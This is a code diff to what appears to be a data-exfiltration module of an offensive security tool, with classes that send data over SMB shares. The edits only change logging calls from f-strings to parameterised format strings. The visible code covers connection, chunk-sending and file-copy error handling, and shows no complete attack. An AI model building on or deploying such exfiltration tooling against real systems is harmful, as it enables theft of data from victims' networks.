@@ -94,7 +94,7 @@ class SMBExfiltration(BaseExfiltration):
             self.logger.error("impacket library not available")
             return False
         except Exception as e:
-            self.logger.error(f"SMB connection failed: {e}")
+            self.logger.error("SMB connection failed: %s", e)
             return False
 
     def disconnect(self) -> None:
@@ -138,7 +138,7 @@ class SMBExfiltration(BaseExfiltration):
             return True
 
         except Exception as e:
-            self.logger.error(f"SMB send chunk failed: {e}")
+            self.logger.error("SMB send chunk failed: %s", e)
             return False
 
     def _flush_buffer(self) -> bool:
@@ -160,7 +160,7 @@ class SMBExfiltration(BaseExfiltration):
             return True
 
         except Exception as e:
-            self.logger.error(f"SMB flush failed: {e}")
+            self.logger.error("SMB flush failed: %s", e)
             return False
 
     def exfiltrate(self, data: bytes):
@@ -254,7 +254,7 @@ class SMBExfiltrationNative(BaseExfiltration):
                     shutil.copy(str(temp_file), str(remote_file))
                     success = True
                 except (OSError, IOError) as e:
-                    self.logger.warning(f"shutil.copy failed: {e}")
+                    self.logger.warning("shutil.copy failed: %s", e)
                     # 降级到 cmd /c copy，但不使用 shell=True
                     # 使用列表参数避免命令注入
                     result = subprocess.run(
@@ -283,7 +283,7 @@ class SMBExfiltrationNative(BaseExfiltration):
             return success
 
         except Exception as e:
-            self.logger.error(f"SMB native send failed: {e}")
+            self.logger.error("SMB native send failed: %s", e)
             return False
 
 
